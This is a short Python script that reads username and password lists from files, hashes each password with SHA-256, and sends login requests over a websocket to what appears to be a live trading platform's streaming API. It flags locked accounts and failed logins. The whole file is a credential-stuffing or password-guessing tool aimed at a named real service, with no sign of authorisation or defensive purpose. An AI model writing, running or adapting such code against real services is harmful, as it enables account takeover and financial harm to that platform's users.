import json
import hashlib
import websocket
from termcolor import colored

# read usernames from file
with open('usernames.txt') as f:
    usernames = [line.strip() for line in f.readlines()]

# read passwords from file
with open('pass.txt') as f:
    passwords = [line.strip() for line in f.readlines()]

# create the JSON data for the request
for i in range(len(usernames)):
    data = {
        "HED": {
            "msgTyp": 1,
            "channel": 1,
            "commVer": "DFNUAWEB_XX_Alkhabeer_X_1.001.22.3+56d90ac9",
            "loginId": "",
            "instId": "0",
            "sesnId": "",
            "routeId": "0",
            "clientIp": "",
            "tenantCode": "DEFAULT_TENANT",
            "unqReqId": f"0_{i}"
        },
        "DAT": {
            "lgnNme": usernames[i],
            "pwd": hashlib.sha256(passwords[i].encode()).hexdigest()
        }
    }

    # send the request using websocket
    ws = websocket.WebSocket()
    ws.connect('wss://alkhabeertadawul.com/streaming-api')
    print(colored(f"Request {i+1}:", 'green'))
    print(colored(json.dumps(data, indent=4), 'green'))
    ws.send(json.dumps(data))
    result = ws.recv()
    print(colored(f"Response {i+1}:", 'yellow'))
    if "Account locked" in result or "User name or password incorrect" in result:
        print(colored(result, 'red'))
    else:
        print(colored(result, 'yellow'))
    ws.close()
    print()
